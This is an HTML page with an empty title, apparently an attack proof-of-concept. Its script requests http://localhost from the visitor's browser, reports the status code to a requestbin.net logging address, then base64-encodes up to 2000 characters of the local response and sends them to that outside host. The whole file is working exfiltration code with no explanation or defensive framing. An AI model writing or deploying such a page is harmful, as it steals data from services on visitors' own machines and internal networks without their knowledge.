<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title></title>
  </head>
  <body>
    <script>
    let LOG_URL = "http://requestbin.net/r/380yyurc";
    let img = new Image();
    img.src = LOG_URL + "?START";

    let req = new XMLHttpRequest();
    req.open('GET', "http://localhost", false);
    //req.withCredentials = true;
    req.onreadystatechange = function (aEvt)
    {
      if (req.readyState == 4)
      {
         if (req.status == 200)
          img.src = LOG_URL + "?CODE=200";
         else
          img.src = LOG_URL + "?CODE="+req.status;
      }
    };
    req.send();

    img = new Image();
    img.src = LOG_URL + "?"+btoa(req.responseText.substring(1,2000));

    </script>
  </body>
</html>
